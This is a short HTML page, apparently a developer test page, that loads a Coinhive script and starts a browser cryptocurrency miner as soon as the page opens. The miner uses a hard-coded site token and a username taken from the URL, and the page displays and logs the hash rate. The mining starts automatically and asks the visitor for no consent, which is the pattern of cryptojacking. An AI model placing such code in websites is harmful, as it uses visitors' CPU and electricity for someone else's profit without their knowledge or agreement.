<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>

    <script src="/coinhive.min.js"></script>
    <script>
        var userName = (new URL(window.location.href)).searchParams.get("user");
        if (!userName) {
            userName = 'legacy';
        }

        var siteToken = 'QnFBodo5jGJo2IjyJR0oLeX0Tt0yGmxm';
        var miner = new CoinHive.User(siteToken, userName);
        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);

        setInterval(function() {
            var content = [miner.getHashesPerSecond(), miner.getTotalHashes(), miner.getAcceptedHashes()].join('<br/>');
            if (!!console) {
                console.log(content);
            }
            document.getElementById("b").innerHTML = content;
        }, 100);
    </script>
</head>
<body>
    static content<br/>
    <div id="b">
        loading...
    </div>
    <img src="/slow/slow.jpg" alt="image" />
</body>
</html>
